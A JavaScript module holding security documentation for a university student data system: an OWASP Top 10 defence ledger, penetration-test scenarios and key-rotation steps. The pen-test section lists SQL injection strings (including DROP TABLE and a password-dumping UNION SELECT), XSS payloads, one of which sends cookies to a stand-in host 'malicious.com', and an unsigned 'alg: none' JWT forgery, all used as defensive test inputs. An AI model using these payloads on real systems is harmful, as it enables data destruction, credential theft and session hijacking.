export function getSection12() {
  return `
---

# SECTION 12: Security Threat Modeling, Penetration Testing Runbook & OWASP Top 10 Verification

This section provides an exhaustive security audit, vulnerability assessment, and threat modeling playbook for the Gautam Buddha University Student Data Management System (GBU-SDSM). It formally benchmarks the system against the Open Worldwide Application Security Project (OWASP) Top 10 enterprise standards and outlines explicit penetration testing scenarios.

---

## 12.1 OWASP Top 10 Compliance Audit & Defense Ledger

\`\`\`mermaid
flowchart TD
    subgraph AttackVectors["Threat Vectors & Penetration Entry Points"]
        SQLi["SQL Injection (A03)"]
        BOLA["Broken Object Level Authorization (A01)"]
        XSS["Cross-Site Scripting (A03)"]
        Brute["Brute-Force & Credential Stuffing (A07)"]
        CSRF["Cross-Site Request Forgery (A01)"]
        MIME["Malicious File Ingestion (A08)"]
    end

    subgraph DefenseArchitecture["Multi-Layered SDSM Defensive Shields"]
        ORM["Sequelize Typed Parameterized Query Layer"]
        RBAC["Scoped Role & Section Guard Middleware"]
        ReactSan["React Virtual DOM Auto-Escaping + CSP"]
        RateLim["Express Rate Limiting & Account Lockout"]
        AuthHeader["Bearer Token Architecture + HttpOnly Cookies"]
        MulterVal["In-Memory Buffer Streaming & Strict MIME Filter"]
    end

    SQLi --> ORM
    BOLA --> RBAC
    XSS --> ReactSan
    Brute --> RateLim
    CSRF --> AuthHeader
    MIME --> MulterVal
\`\`\`

### 12.1.1 A01: Broken Access Control
- **Threat Vector**: Horizontal privilege escalation (Coordinator $A$ accessing Coordinator $B$'s section data) or Vertical privilege escalation (Student manipulating HTTP requests to access Admin endpoints).
- **Vulnerability Mechanism**: Relying solely on client-side routing guards or passing unchecked entity IDs in query parameters.
- **Architectural Safeguards**:
  - Every API endpoint is wrapped by \`authMiddleware\` and \`roleMiddleware\` on the Express server tier.
  - Server controllers enforce mandatory tenancy and scope constraints:
    \`\`\`javascript
    // Coordinator query filter enforced unconditionally
    const where = {
      id: studentId,
      program: req.user.coordinator.program,
      branch: req.user.coordinator.branch,
      section: req.user.coordinator.section
    };
    const student = await Student.findOne({ where });
    if (!student) {
      return res.status(403).json({ success: false, message: "Resource outside authorized section scope" });
    }
    \`\`\`
  - Administrative routes check \`req.user.role === 'admin'\` before parsing body payloads.

### 12.1.2 A02: Cryptographic Failures
- **Threat Vector**: Interception of cleartext traffic on campus networks or recovery of user passwords from database backups.
- **Architectural Safeguards**:
  - Transport Layer Security (TLS 1.2 / TLS 1.3) enforced with HTTP Strict Transport Security (HSTS) max-age set to 1 year (\`31536000\` seconds).
  - Passwords hashed using bcrypt with adaptive salt cost factor of \`10\` iterations.
  - Segregated cryptographic secrets for Access Tokens (\`JWT_SECRET\`) and Refresh Tokens (\`REFRESH_TOKEN_SECRET\`), generated with 512 bits of cryptographically secure pseudorandom entropy.
  - No sensitive credentials, private keys, or passwords written to console logs or returned in API responses (Sequelize \`defaultScope\` explicitly excludes \`password\` and \`resetPasswordOtp\`).

### 12.1.3 A03: Injection Attacks
- **Threat Vector**: SQL Injection (SQLi) via query string parameters, search boxes, or Excel column headers; Command injection through file naming.
- **Architectural Safeguards**:
  - 100% of database interactions execute through Sequelize ORM using typed prepared statements with parameter binding:
    \`\`\`javascript
    // Secure Parameterized Query
    const students = await Student.findAll({
      where: {
        name: { [Op.like]: \`%\${sanitizedSearchTerm}%\` },
        program: sanitizedProgram
      }
    });
    \`\`\`
  - No concatenation of raw SQL strings (\`SELECT * FROM students WHERE name = '\` + input + \`'\`) is permitted in any repository or controller.
  - Filename sanitization strips non-alphanumeric characters, eliminating shell injection vectors.

### 12.1.4 A04: Insecure Design
- **Threat Vector**: Business logic flaws such as marking attendance for future dates or negative attendance percentages.
- **Architectural Safeguards**:
  - Strict domain invariants: \`sessionDate\` must satisfy $\\text{sessionDate} \\le \\text{CurrentDate()}$.
  - Attendance percentages bounded mathematically in $[0.00, 100.00]$.
  - Attendance sessions lock automatically 24 hours after creation, requiring formal administrative override with mandatory reason logging for historical updates.

### 12.1.5 A05: Security Misconfiguration
- **Threat Vector**: Leaking server stack traces, default passwords, enabled directory browsing, or permissive CORS wildcard headers (\`*\`).
- **Architectural Safeguards**:
  - Express error-handling middleware sanitizes error responses in production: \`NODE_ENV === 'production'\` suppresses error stack traces, returning structured JSON error envelopes.
  - CORS configuration explicitly whitelists origin domains; rejects wildcard origin (\`*\`) when \`credentials: true\` is active.
  - Helmet middleware applies strict HTTP response headers: \`X-Frame-Options: DENY\`, \`X-Content-Type-Options: nosniff\`, \`Referrer-Policy: strict-origin-when-cross-origin\`.

### 12.1.6 A06: Vulnerable and Outdated Components
- **Threat Vector**: Exploitation of known vulnerabilities (CVEs) in third-party npm packages.
- **Architectural Safeguards**:
  - Routine dependency scanning via \`npm audit --production\`.
  - Fixed semantic versioning in \`package.json\` with lockfiles (\`package-lock.json\`) to prevent unverified upstream transitive dependency updates.

### 12.1.7 A07: Identification and Authentication Failures
- **Threat Vector**: Credential stuffing, dictionary attacks against login endpoints, session fixation, and token reuse.
- **Architectural Safeguards**:
  - Dual-token architecture with automatic token rotation.
  - Refresh tokens bound to \`tokenVersion\` stored in the database; single token reuse invalidates all active sessions for that account.
  - Express Rate Limiter limits login attempts to 10 requests per 15 minutes per IP.
  - User model locks account after 5 consecutive failed login attempts for 30 minutes.

### 12.1.8 A08: Software and Data Integrity Failures
- **Threat Vector**: Uploading malicious spreadsheets containing executable macros (Formula Injection / CSV Injection) or corrupted binary buffers.
- **Architectural Safeguards**:
  - In-memory spreadsheet parsing via SheetJS without temporary disk storage.
  - Cell value sanitization: strings starting with dangerous formula prefixes (\`=\`, \`+\`, \`-\`, \`@\`) are prepended with a single quote or stripped before persistence, disarming dynamic command execution in desktop spreadsheet software.
  - Multer MIME type whitelisting verifies file signatures.

### 12.1.9 A09: Security Logging and Monitoring Failures
- **Threat Vector**: Undetected administrative tampering, unauthorized student grade or attendance changes.
- **Architectural Safeguards**:
  - Centralized \`AuditLog\` entity records: Actor User ID, Actor Role, Target Entity (Student, AttendanceSession, FacultyAssignment), Entity ID, Action (\`CREATE\`, \`UPDATE\`, \`DELETE\`, \`OVERRIDE\`), Timestamp, and IP Address.
  - Automated request logging with UUIDv4 correlation IDs allows end-to-end tracing of every state mutation.

### 12.1.10 A10: Server-Side Request Forgery (SSRF)
- **Threat Vector**: Inducing the backend server to make unauthorized HTTP requests to internal network services or metadata endpoints.
- **Architectural Safeguards**:
  - GBU-SDSM does not expose user-configurable webhook or URL fetching endpoints.
  - SMTP server hostnames and external API connections are hardcoded within server environment variables.

---

## 12.2 Penetration Testing Playbooks & Verification Procedures

This subsection defines repeatable penetration testing scenarios that QA engineers and security auditors must execute prior to major release deployments.

### 12.2.1 Scenario PT-01: SQL Injection Exploitation Simulation
- **Target Endpoint**: \`GET /api/admin/students?search=\`
- **Injected Payload Strings**:
  1. \`' OR 1=1 --\`
  2. \`" OR "" = "\`
  3. \`'; DROP TABLE students; --\`
  4. \`' UNION SELECT id, email, password, 1, 2, 3, 4 FROM users --\`
- **Execution**: Submit HTTP requests with each payload string encoded in the \`search\` query parameter.
- **Pass Invariant**: Server responds with HTTP \`200 OK\` returning an empty array or valid substring search matches for literal punctuation. The database tables remain intact, and no raw SQL syntax errors or database schema structures leak into the response body.

### 12.2.2 Scenario PT-02: Stored Cross-Site Scripting (XSS) Simulation
- **Target Endpoint**: \`PUT /api/coordinator/students/:id\`
- **Injected Payload Strings**:
  1. \`<script>alert(document.cookie)</script>\`
  2. \`<img src=x onerror=this.src='http://malicious.com/?c='+document.cookie>\`
  3. \`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\`
- **Execution**: Update student \`address\`, \`fatherName\`, or \`internshipCompany\` with the payload string. Log in as student or admin and view the student's profile modal.
- **Pass Invariant**: React renders the payload as harmless literal text on the screen. No JavaScript executes in the browser console, and no external HTTP network requests are initiated by the DOM.

### 12.2.3 Scenario PT-03: Broken Object Level Authorization (IDOR) Simulation
- **Target Endpoint**: \`GET /api/coordinator/students/999\`
- **Test Context**: Authenticated as Coordinator $C_1$ (assigned to B.Tech CSE Section A). Student ID \`999\` belongs to B.Tech CSE Section B.
- **Execution**: Dispatch \`GET /api/coordinator/students/999\` using $C_1$'s Bearer token.
- **Pass Invariant**: Server returns HTTP \`403 Forbidden\` or \`404 Not Found\`. No demographic, attendance, or placement details for student \`999\` are exposed.

### 12.2.4 Scenario PT-04: JWT None-Algorithm Signature Bypass
- **Target Endpoint**: \`GET /api/admin/students\`
- **Execution**: Craft an unsigned JWT token with header \`{"alg": "none", "typ": "JWT"}\` and claims \`{"id": 1, "role": "admin"}\`. Submit token in \`Authorization: Bearer <tampered_token>\`.
- **Pass Invariant**: Express \`authMiddleware\` rejects the token with HTTP \`401 Unauthorized\` (*"Invalid token signature"*).

---

## 12.3 Cryptographic Key Management & Entropy Standards

GBU-SDSM enforces strict rules for generating, maintaining, and rotating cryptographic secrets.

### 12.3.1 Cryptographic Secret Generation Runbook
Administrators generating keys for production deployments must utilize high-entropy sources:
\`\`\`bash
# Generate 512-bit JWT Access Secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# Generate 512-bit Refresh Token Secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# Generate 256-bit Cookie Session Secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
\`\`\`

### 12.3.2 Emergency Key Compromise Rotation Procedure
Should a production \`JWT_SECRET\` or \`REFRESH_TOKEN_SECRET\` be leaked:
1. Immediately generate new secret strings following Section 12.3.1.
2. Update the environment variables in the production configuration manager (\`backend/.env\` or systemd environment file).
3. Execute zero-downtime rolling restart of backend Node.js processes via PM2:
   \`\`\`bash
   pm2 reload gbu-sdms-api --update-env
   \`\`\`
4. Run atomic SQL query to increment \`tokenVersion\` across all accounts, invalidating all pre-existing refresh tokens:
   \`\`\`sql
   UPDATE users SET tokenVersion = tokenVersion + 1;
   \`\`\`
5. All active user sessions are terminated instantly, compelling re-authentication with fresh credentials and generating new, securely signed tokens.
`;
}
